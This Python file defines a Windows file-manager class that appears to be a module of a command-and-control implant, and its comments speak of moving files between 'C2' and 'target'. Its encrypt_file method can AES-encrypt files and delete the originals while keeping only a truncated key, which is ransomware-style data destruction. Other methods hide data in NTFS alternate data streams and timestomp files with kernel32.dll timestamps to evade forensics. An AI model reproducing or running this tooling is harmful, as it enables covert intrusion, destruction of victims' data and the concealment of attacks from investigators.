import os, shutil, stat, hashlib, json, time, zipfile, tarfile, ctypes, ctypes.wintypes
from datetime import datetime
import win32file, win32con, win32security, pywintypes

class FileManager:
    def __init__(self):
        self.current_dir = os.getcwd()
        
    def change_directory(self, path):
        """Change current directory."""
        try:
            if not path:
                return {"error": "No path provided"}
            
            # Handle special paths
            if path == "..":
                new_dir = os.path.dirname(self.current_dir)
            elif path == ".":
                new_dir = self.current_dir
            elif path.startswith("~"):
                # Home directory
                new_dir = os.path.expanduser(path)
            else:
                # Relative or absolute path
                if os.path.isabs(path):
                    new_dir = path
                else:
                    new_dir = os.path.join(self.current_dir, path)
            
            # Check if directory exists
            if os.path.exists(new_dir) and os.path.isdir(new_dir):
                self.current_dir = os.path.abspath(new_dir)
                return {
                    "success": True,
                    "new_path": self.current_dir,
                    "message": f"Changed directory to {self.current_dir}"
                }
            else:
                return {"error": f"Directory does not exist: {new_dir}"}
                
        except Exception as e:
            return {"error": str(e)}
    
    def current_directory(self):
        """Get current directory."""
        return {
            "path": self.current_dir,
            "exists": os.path.exists(self.current_dir),
            "free_space": self.get_free_space(self.current_dir)
        }
    
    def list_directory(self, path=None, detailed=False):
        """List directory contents."""
        if not path:
            path = self.current_dir
        
        try:
            if not os.path.exists(path):
                return {"error": f"Path does not exist: {path}"}
            
            if not os.path.isdir(path):
                return {"error": f"Not a directory: {path}"}
            
            items = []
            total_size = 0
            file_count = 0
            dir_count = 0
            
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                
                try:
                    stat_info = os.stat(item_path)
                    
                    item_info = {
                        "name": item,
                        "is_dir": os.path.isdir(item_path),
                        "size": stat_info.st_size if not os.path.isdir(item_path) else 0,
                        "modified": datetime.fromtimestamp(stat_info.st_mtime).isoformat(),
                        "created": datetime.fromtimestamp(stat_info.st_ctime).isoformat(),
                        "permissions": oct(stat_info.st_mode)[-3:]
                    }
                    
                    if detailed:
                        # Get additional info
                        item_info.update({
                            "accessed": datetime.fromtimestamp(stat_info.st_atime).isoformat(),
                            "owner": self.get_file_owner(item_path),
                            "attributes": self.get_file_attributes(item_path),
                            "hash": self.calculate_hash(item_path) if not os.path.isdir(item_path) else None
                        })
                    
                    items.append(item_info)
                    
                    if os.path.isdir(item_path):
                        dir_count += 1
                    else:
                        file_count += 1
                        total_size += stat_info.st_size
                        
                except Exception as e:
                    items.append({
                        "name": item,
                        "error": str(e)
                    })
            
            # Sort: directories first, then by name
            items.sort(key=lambda x: (not x.get('is_dir', False), x['name'].lower()))
            
            return {
                "path": path,
                "items": items,
                "summary": {
                    "total_items": len(items),
                    "files": file_count,
                    "directories": dir_count,
                    "total_size": total_size,
                    "free_space": self.get_free_space(path)
                }
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    def get_file_owner(self, path):
        """Get file owner."""
        try:
            sd = win32security.GetFileSecurity(path, win32security.OWNER_SECURITY_INFORMATION)
            owner_sid = sd.GetSecurityDescriptorOwner()
            name, domain, _ = win32security.LookupAccountSid(None, owner_sid)
            return f"{domain}\\{name}"
        except:
            return "Unknown"
    
    def get_file_attributes(self, path):
        """Get Windows file attributes."""
        try:
            attrs = win32file.GetFileAttributes(path)
            
            attribute_names = []
            if attrs & win32con.FILE_ATTRIBUTE_READONLY:
                attribute_names.append("READONLY")
            if attrs & win32con.FILE_ATTRIBUTE_HIDDEN:
                attribute_names.append("HIDDEN")
            if attrs & win32con.FILE_ATTRIBUTE_SYSTEM:
                attribute_names.append("SYSTEM")
            if attrs & win32con.FILE_ATTRIBUTE_ARCHIVE:
                attribute_names.append("ARCHIVE")
            if attrs & win32con.FILE_ATTRIBUTE_COMPRESSED:
                attribute_names.append("COMPRESSED")
            if attrs & win32con.FILE_ATTRIBUTE_ENCRYPTED:
                attribute_names.append("ENCRYPTED")
            
            return attribute_names
        except:
            return []
    
    def calculate_hash(self, path, algorithm='sha256'):
        """Calculate file hash."""
        if not os.path.isfile(path):
            return None
        
        try:
            hash_func = hashlib.new(algorithm)
            
            with open(path, 'rb') as f:
                # Read in chunks for large files
                for chunk in iter(lambda: f.read(8192), b''):
                    hash_func.update(chunk)
            
            return hash_func.hexdigest()
        except:
            return None
    
    def get_free_space(self, path):
        """Get free space on drive."""
        try:
            _, total, free = shutil.disk_usage(path)
            return {
                "free": free,
                "total": total,
                "used": total - free,
                "free_percent": (free / total) * 100 if total > 0 else 0
            }
        except:
            return None
    
    def find_files(self, pattern, search_path=None, recursive=True):
        """Find files matching pattern."""
        if not search_path:
            search_path = self.current_dir
        
        results = []
        
        try:
            if recursive:
                for root, dirs, files in os.walk(search_path):
                    for file in files:
                        if self.match_pattern(file, pattern):
                            file_path = os.path.join(root, file)
                            results.append(file_path)
            else:
                for item in os.listdir(search_path):
                    item_path = os.path.join(search_path, item)
                    if os.path.isfile(item_path) and self.match_pattern(item, pattern):
                        results.append(item_path)
            
            return {
                "pattern": pattern,
                "search_path": search_path,
                "results": results,
                "count": len(results)
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    def match_pattern(self, filename, pattern):
        """Match filename against pattern (supports * and ?)."""
        import fnmatch
        return fnmatch.fnmatch(filename, pattern)
    
    def upload(self, local_path, remote_path=None):
        """Upload file to target (simulated - would need actual transfer)."""
        if not os.path.exists(local_path):
            return {"error": f"Local file does not exist: {local_path}"}
        
        if not remote_path:
            # Use same filename in current directory
            remote_path = os.path.join(self.current_dir, os.path.basename(local_path))
        
        try:
            # In reality, this would transfer file from C2 to target
            # For simulation, just copy locally
            shutil.copy2(local_path, remote_path)
            
            return {
                "success": True,
                "local": local_path,
                "remote": remote_path,
                "size": os.path.getsize(local_path),
                "message": f"File would be uploaded to {remote_path}"
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    def download(self, remote_path, local_path=None):
        """Download file from target (simulated)."""
        if not os.path.exists(remote_path):
            return {"error": f"Remote file does not exist: {remote_path}"}
        
        if not local_path:
            # Use same filename in temp directory
            local_path = os.path.join(os.environ['TEMP'], os.path.basename(remote_path))
        
        try:
            # In reality, this would transfer file from target to C2
            # For simulation, just copy locally
            shutil.copy2(remote_path, local_path)
            
            return {
                "success": True,
                "remote": remote_path,
                "local": local_path,
                "size": os.path.getsize(remote_path),
                "message": f"File would be downloaded to {local_path}"
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    def delete(self, path, force=False):
        """Delete file or directory."""
        if not os.path.exists(path):
            return {"error": f"Path does not exist: {path}"}
        
        try:
            if os.path.isdir(path):
                if force:
                    shutil.rmtree(path)
                    message = f"Directory {path} force deleted"
                else:
                    os.rmdir(path)
                    message = f"Directory {path} deleted"
            else:
                os.remove(path)
                message = f"File {path} deleted"
            
            return {
                "success": True,
                "path": path,
                "message": message
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    def encrypt_file(self, path, key=None, simulate=True):
        """Encrypt a file."""
        if not os.path.exists(path):
            return {"error": f"File does not exist: {path}"}
        
        if simulate:
            # Simulation mode - just rename with .encrypted extension
            encrypted_path = path + '.encrypted'
            
            try:
                shutil.copy2(path, encrypted_path)
                
                return {
                    "success": True,
                    "original": path,
                    "encrypted": encrypted_path,
                    "simulated": True,
                    "message": "File encryption simulated"
                }
            except Exception as e:
                return {"error": str(e)}
        else:
            # Real encryption
            if not key:
                key = os.urandom(32)  # 256-bit key
            
            try:
                from Crypto.Cipher import AES
                from Crypto.Util.Padding import pad
                
                with open(path, 'rb') as f:
                    data = f.read()
                
                cipher = AES.new(key, AES.MODE_CBC)
                ct_bytes = cipher.encrypt(pad(data, AES.block_size))
                
                encrypted_path = path + '.aes'
                with open(encrypted_path, 'wb') as f:
                    f.write(cipher.iv)
                    f.write(ct_bytes)
                
                # Remove original if encryption succeeded
                os.remove(path)
                
                return {
                    "success": True,
                    "original": path,
                    "encrypted": encrypted_path,
                    "key": key.hex()[:32] + "...",
                    "simulated": False,
                    "message": "File encrypted with AES-256-CBC"
                }
                
            except Exception as e:
                return {"error": f"Encryption failed: {e}"}
    
    def decrypt_file(self, path, key=None, simulate=True):
        """Decrypt a file."""
        if not os.path.exists(path):
            return {"error": f"File does not exist: {path}"}
        
        if simulate:
            # Remove .encrypted extension
            if path.endswith('.encrypted'):
                decrypted_path = path[:-10]
            elif path.endswith('.aes'):
                decrypted_path = path[:-4]
            else:
                decrypted_path = path + '.decrypted'
            
            try:
                shutil.copy2(path, decrypted_path)
                
                return {
                    "success": True,
                    "encrypted": path,
                    "decrypted": decrypted_path,
                    "simulated": True,
                    "message": "File decryption simulated"
                }
            except Exception as e:
                return {"error": str(e)}
        else:
            # Real decryption
            try:
                from Crypto.Cipher import AES
                from Crypto.Util.Padding import unpad
                
                with open(path, 'rb') as f:
                    iv = f.read(16)
                    ct = f.read()
                
                if not key:
                    return {"error": "Decryption key required"}
                
                cipher = AES.new(key, AES.MODE_CBC, iv)
                pt = unpad(cipher.decrypt(ct), AES.block_size)
                
                decrypted_path = path[:-4] if path.endswith('.aes') else path + '.decrypted'
                with open(decrypted_path, 'wb') as f:
                    f.write(pt)
                
                return {
                    "success": True,
                    "encrypted": path,
                    "decrypted": decrypted_path,
                    "simulated": False,
                    "message": "File decrypted"
                }
                
            except Exception as e:
                return {"error": f"Decryption failed: {e}"}
    
    def search_content(self, path, search_string, recursive=True):
        """Search for string in files."""
        results = []
        
        try:
            if os.path.isfile(path):
                files_to_search = [path]
            elif recursive:
                files_to_search = []
                for root, dirs, files in os.walk(path):
                    for file in files:
                        files_to_search.append(os.path.join(root, file))
            else:
                files_to_search = []
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    if os.path.isfile(item_path):
                        files_to_search.append(item_path)
            
            for file_path in files_to_search:
                try:
                    # Skip binary files
                    with open(file_path, 'rb') as f:
                        sample = f.read(1024)
                    
                    # Check if binary
                    if b'\x00' in sample:
                        continue
                    
                    # Search in file
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    
                    if search_string in content:
                        # Find all occurrences
                        positions = []
                        start = 0
                        while True:
                            pos = content.find(search_string, start)
                            if pos == -1:
                                break
                            positions.append(pos)
                            start = pos + 1
                        
                        if positions:
                            results.append({
                                "file": file_path,
                                "occurrences": len(positions),
                                "positions": positions[:10]  # Limit
                            })
                            
                except:
                    continue
            
            return {
                "search_string": search_string,
                "path": path,
                "results": results,
                "count": len(results)
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    def create_alternate_data_stream(self, file_path, stream_name, data):
        """Create NTFS Alternate Data Stream."""
        stream_path = f"{file_path}:{stream_name}"
        
        try:
            with open(stream_path, 'wb') as f:
                f.write(data.encode() if isinstance(data, str) else data)
            
            return {
                "success": True,
                "file": file_path,
                "stream": stream_name,
                "stream_path": stream_path,
                "size": len(data)
            }
        except Exception as e:
            return {"error": str(e)}
    
    def timestomp(self, target_path, source_path=None):
        """Copy timestamps from one file to another."""
        if not os.path.exists(target_path):
            return {"error": f"Target path does not exist: {target_path}"}
        
        try:
            if source_path and os.path.exists(source_path):
                # Copy timestamps from source file
                stat_info = os.stat(source_path)
                atime = stat_info.st_atime
                mtime = stat_info.st_mtime
            else:
                # Use legitimate system file timestamps
                source_path = "C:\\Windows\\System32\\kernel32.dll"
                if os.path.exists(source_path):
                    stat_info = os.stat(source_path)
                    atime = stat_info.st_atime
                    mtime = stat_info.st_mtime
                else:
                    # Use current time minus random offset
                    import random
                    current_time = time.time()
                    atime = current_time - random.randint(86400, 2592000)  # 1-30 days ago
                    mtime = atime
            
            # Apply timestamps
            os.utime(target_path, (atime, mtime))
            
            return {
                "success": True,
                "target": target_path,
                "source": source_path if source_path else "generated",
                "atime": datetime.fromtimestamp(atime).isoformat(),
                "mtime": datetime.fromtimestamp(mtime).isoformat()
            }
            
        except Exception as e:
            return {"error": str(e)}